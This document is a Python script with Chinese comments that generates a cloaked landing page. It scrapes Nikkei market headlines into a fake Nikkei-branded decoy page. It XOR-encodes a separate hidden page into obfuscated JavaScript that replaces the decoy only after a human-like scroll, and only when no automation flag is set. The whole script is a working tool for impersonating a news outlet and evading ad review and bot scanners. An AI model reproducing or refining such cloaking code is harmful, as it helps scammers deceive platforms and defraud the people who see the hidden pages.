import os
import random
import string
import json
import shutil
import requests
import datetime
import urllib.parse
from bs4 import BeautifulSoup

# ================= 配置区 =================
TARGET_REAL_PAGE = "index.html"  
OUTPUT_ZIP_NAME = "nikkei_styled_lp"     
XOR_KEY = random.randint(10, 250) 
# ==========================================

class LPAutomatorV5Nikkei:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        self.map = {}
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """步骤 1: 采集新闻并生成高度还原日经官网的白页"""
        print("📡 正在同步日经市场动态并构建视觉外壳...")
        url = "https://www.nikkei.com/news/category/market/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        try:
            res = requests.get(url, headers=headers, timeout=15)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            articles = []
            for item in soup.select('article')[:15]:
                title = item.find('span', class_=lambda x: x and 'title' in x)
                summary = item.find('p')
                if title:
                    articles.append({
                        "t": title.get_text().strip(), 
                        "s": summary.get_text().strip() if summary else "詳細な市場データと経済指標の分析は続いています..."
                    })
            
            # 日经风格 CSS 深度定制
            css = """
            body { font-family: "Hiragino Sans", "Meiryo", sans-serif; color: #333; line-height: 1.6; margin: 0; background: #fff; }
            .n-header { border-bottom: 2px solid #003366; padding: 15px 5%; display: flex; align-items: center; justify-content: space-between; background: #fff; position: sticky; top: 0; z-index: 100; }
            .n-logo { color: #003366; font-size: 24px; font-weight: 900; letter-spacing: -1px; }
            .n-nav { display: flex; gap: 20px; font-size: 14px; color: #666; font-weight: bold; }
            .n-main { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: 1fr 300px; gap: 40px; padding: 20px 5%; }
            .n-badge { background: #e60012; color: #fff; font-size: 11px; padding: 2px 6px; font-weight: bold; margin-right: 8px; border-radius: 2px; }
            .n-article { margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 20px; }
            .n-title { font-size: 19px; color: #000; font-weight: 900; margin: 10px 0; cursor: pointer; }
            .n-title:hover { color: #003366; text-decoration: underline; }
            .n-summary { font-size: 14px; color: #444; }
            .n-sidebar-box { background: #f4f4f4; padding: 20px; border-top: 2px solid #333; }
            .n-side-title { font-size: 16px; font-weight: bold; margin-bottom: 15px; }
            .n-footer { background: #111; color: #888; padding: 40px 5%; font-size: 11px; text-align: center; }
            """

            html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>日本経済新聞 - マーケット・経済ニュース</title>
            <style>{css}</style></head><body>
            <header class="n-header">
                <div class="n-logo">NIKKEI <span style="font-size:12px; color:#999;">Financial Insight</span></div>
                <div class="n-nav"><div>マーケット</div><div>経済</div><div>政治</div><div>ビジネス</div></div>
            </header>
            <div class="n-main">
                <section>
                    <div style="font-size: 12px; color: #999; margin-bottom: 20px;">
                        マーケット速报 / {datetime.datetime.now().strftime('%Y年%m月%d日 %H:%M')} 更新
                    </div>
            """
            for a in articles:
                html += f"""
                <div class="n-article">
                    <span class="n-badge">速報</span>
                    <div class="n-title">{a['t']}</div>
                    <div class="n-summary">{a['s']}</div>
                </div>"""
            
            html += f"""
                </section>
                <aside>
                    <div class="n-sidebar-box">
                        <div class="n-side-title">アクセスランキング</div>
                        <div style="font-size:13px; color:#003366; font-weight:bold;">1. 円相場、140円台で推移</div>
                        <div style="font-size:13px; color:#003366; font-weight:bold; margin-top:10px;">2. 日経平均、続伸の背景</div>
                    </div>
                </aside>
            </div>
            <footer class="n-footer">
                日本経済新聞社について | 著作権 | プライバシー | ヘルプ | 利用規約<br><br>
                © {datetime.date.today().year} Nikkei Inc. All rights reserved.
            </footer>
            </body></html>"""
            
            with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)
            print("✅ 视觉外壳生成成功（视觉效果模拟度：极高）。")
        except Exception as e:
            print(f"❌ 视觉定制失败: {e}")

    # [此处保留上一版本的 scramble_and_pack 和 create_zip 函数逻辑]
    def scramble_and_pack(self):
        """步骤 2: 执行 V5 级加密混淆"""
        print("🔐 正在注入 XOR 加密层并随机化指纹...")
        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents]) if w_soup.body else str(w_soup)
            w_title = w_soup.title.string if w_soup.title else "Market News"

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        clean_src = urllib.parse.urlparse(src).path
                        dest = os.path.join(self.dist_dir, clean_src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(clean_src): shutil.copy(clean_src, dest)

        target_node = r_soup.find(id="main-content") or r_soup.body
        raw_html = "".join([str(x) for x in target_node.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        
        v_data, v_key, v_res, v_check, v_root = [self._rand_str(6) for _ in range(5)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#{v_root}{{min-height:210vh;background:#fff}}</style></head>
        <body><div id="{v_root}">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{console.clear();}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: 
            f.write(final_html)

    def create_zip(self):
        print(f"📦 正在打包最终产物...")
        shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
        print(f"✨ 大功告成！文件已打包为: {OUTPUT_ZIP_NAME}.zip")

if __name__ == "__main__":
    if not os.path.exists(TARGET_REAL_PAGE):
        print(f"❌ 错误: 找不到 {TARGET_REAL_PAGE}")
    else:
        flow = LPAutomatorV5Nikkei()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
        input("\n处理完成，按回车退出...")
